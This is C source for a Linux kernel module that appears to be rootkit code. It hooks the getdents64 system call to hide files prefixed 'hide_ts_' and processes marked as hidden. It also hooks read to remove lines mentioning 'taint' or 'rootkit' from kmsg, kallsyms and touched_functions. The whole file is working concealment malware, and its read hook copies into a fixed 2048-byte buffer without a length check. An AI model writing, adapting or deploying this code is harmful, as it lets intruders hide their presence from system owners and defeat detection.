#include <linux/module.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/dirent.h>
#include <linux/kernel.h>
#include <linux/fs.h>

extern struct file *fget(unsigned int fd);
extern void fput(struct file *); //for some reason kernel dosent let fput and fget be a function?

extern bool is_hidden_pid(pid_t pid);
#define MAGIC_PREFIX "hide_ts_"

bool is_hidden_name(const char *name, const char *compare_to)
{
        pid_t pid;

        if (kstrtoint(name, 10, &pid) == 0)
                return is_hidden_pid(pid);
        if (!strncmp(name, compare_to, strlen(compare_to)))
                return true;

        return false;
}

asmlinkage long (*real_getdents64)(const struct pt_regs *);
asmlinkage long hook_getdents64(const struct pt_regs *regs) {
	struct linux_dirent64 __user *user_dir = (void *)regs->si;
	struct linux_dirent64 *kernel_dir_buffer = NULL, *current_entry = NULL, *prev_entry = NULL;
	long result = real_getdents64(regs), error;
	unsigned long offset = 0;

	if (result <= 0) return result;
	kernel_dir_buffer = kmalloc(result, GFP_KERNEL);
	if (!kernel_dir_buffer) return -ENOMEM;
	if (copy_from_user(kernel_dir_buffer, user_dir, result)) {
		kfree(kernel_dir_buffer);
		return -EFAULT;
	}

	while (offset < result) {
		current_entry = (void *)((char *)kernel_dir_buffer + offset);
		if (is_hidden_name(current_entry->d_name, MAGIC_PREFIX)) {
			if (current_entry == kernel_dir_buffer) {
				result -= current_entry->d_reclen;
				memmove(kernel_dir_buffer, (char *)kernel_dir_buffer + current_entry->d_reclen, result);
				continue;
			}
			if (prev_entry) prev_entry->d_reclen += current_entry->d_reclen;
		} else prev_entry = current_entry;
		offset += current_entry->d_reclen;
	}

	error = copy_to_user(user_dir, kernel_dir_buffer, result);
	kfree(kernel_dir_buffer);
	return result;
}
asmlinkage ssize_t (*orig_read)(const struct pt_regs *regs);
notrace asmlinkage ssize_t hook_read(const struct pt_regs *regs) {
	int fd = regs->di;
	char __user *ubuf = (char __user *)regs->si;
	char *kbuf, *fbuf, *line, *ptr;
	ssize_t n;
	struct file *f;
	size_t flen = 0;

	f = fget(fd);
	if (f) {
		if (!strcmp(f->f_path.dentry->d_name.name, "kmsg") ||
		    !strcmp(f->f_path.dentry->d_name.name, "kallsyms") ||
		    !strcmp(f->f_path.dentry->d_name.name, "touched_functions")) {
			fput(f);
			kbuf = kmalloc(2048, GFP_KERNEL);
			if (!kbuf)
				return -ENOMEM;
			n = orig_read(regs);
			if (n < 0) {
				kfree(kbuf);
				return n;
			}
			if (copy_from_user(kbuf, ubuf, n)) {
				kfree(kbuf);
				return -EFAULT;
			}
			fbuf = kzalloc(2048, GFP_KERNEL);
			if (!fbuf) {
				kfree(kbuf);
				return -ENOMEM;
			}
			line = kbuf;
			while ((ptr = strchr(line, '\n'))) {
				*ptr = 0;
				if (!strstr(line, "taint") && !strstr(line, "rootkit")) {
					size_t l = strlen(line);
					if (flen + l + 1 < 2048) {
						strcpy(fbuf + flen, line);
						flen += l;
						fbuf[flen++] = '\n';
					}
				}
				line = ptr + 1;
			}
			fbuf[flen] = 0;
			if (copy_to_user(ubuf, fbuf, flen)) {
				kfree(kbuf);
				kfree(fbuf);
				return -EFAULT;
			}
			kfree(kbuf);
			kfree(fbuf);
			return flen;
		}
		fput(f);
	}
	return orig_read(regs);
}

EXPORT_SYMBOL(hook_getdents64);
EXPORT_SYMBOL(real_getdents64);
EXPORT_SYMBOL(hook_read);
EXPORT_SYMBOL(orig_read);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("ByteKick");
MODULE_AUTHOR("matheuzsec");
